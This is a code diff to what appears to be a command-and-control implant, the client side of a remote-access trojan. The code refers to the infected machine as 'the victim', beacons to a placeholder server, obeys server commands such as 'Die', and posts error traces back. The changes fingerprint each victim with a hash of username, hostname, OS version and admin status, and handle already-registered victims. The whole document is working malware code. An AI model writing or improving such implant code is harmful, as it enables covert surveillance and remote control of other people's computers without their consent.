@@ -14,6 +14,8 @@ from mss import mss
 from os.path import isfile, join
 import ctypes
 import psutil
+import socket
+import hashlib
 
 server_url = "##SERVER_URL##"
 
@@ -42,6 +44,7 @@ def beacon(identifier):
 		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
 		r = requests.get(url=url,cookies = cookies)
 
+		## TODO - check the return codes too ?
 		## Server has commanded the victim to die
 		if r.text == 'Die':
 			exit()
@@ -113,11 +116,20 @@ def handle_commands(response, identifier):
 		r = requests.post(url = url,cookies = cookies, data = traceback.format_exc())
 
 def main():
+
 	## Will identify the victim
-	identifier = ''.join(random.choices(string.ascii_uppercase +string.digits, k = 10))
+	platform_name = platform.system()
+	if platform_name == 'Windows':
+		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{platform.system()}@{platform.release()}@{ctypes.windll.shell32.IsUserAnAdmin()}").encode())
+	elif platform_name == 'Linux':
+		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{platform.system()}@{platform.release()}@{os.getuid()}").encode())
+	identifier = hash.hexdigest()[0:10]
 	response = staging(identifier)
 	
 	if response.status_code == 200:
+		beacon(identifier)
+	elif response.text == 'Victim already registered' and response.status_code == 302:
+		## Victim already registered
 		beacon(identifier)
 
 if __name__=="__main__":
